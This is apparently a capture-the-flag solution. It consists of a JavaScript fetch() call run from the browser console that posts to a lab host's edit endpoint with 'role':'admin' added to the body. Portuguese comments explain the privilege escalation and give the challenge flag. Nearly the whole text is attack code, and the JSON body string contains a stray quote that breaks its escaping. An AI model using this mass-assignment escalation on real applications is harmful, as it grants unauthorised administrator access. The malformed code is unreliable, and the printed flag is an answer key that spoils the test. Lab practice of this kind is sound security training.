await fetch("http://box4-806822361.us-east-1.elb.amazonaws.com/edit", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/json"
    },
    "referrer": "http://box4-806822361.us-east-1.elb.amazonaws.com/edit",
    "body": "{\"username\":\"user\", \"role\":\"admin"\"}", // role - admin acrescentado
    "method": "POST",
    "mode": "cors"
});

// **FLAG{RESTRICTED_ACCESS}**
// Escalacao de Privilegios com o fetch no console do DevTools, usando o Networking e vendo a permissao de edicao do escopo cadastral, mude a role para admin
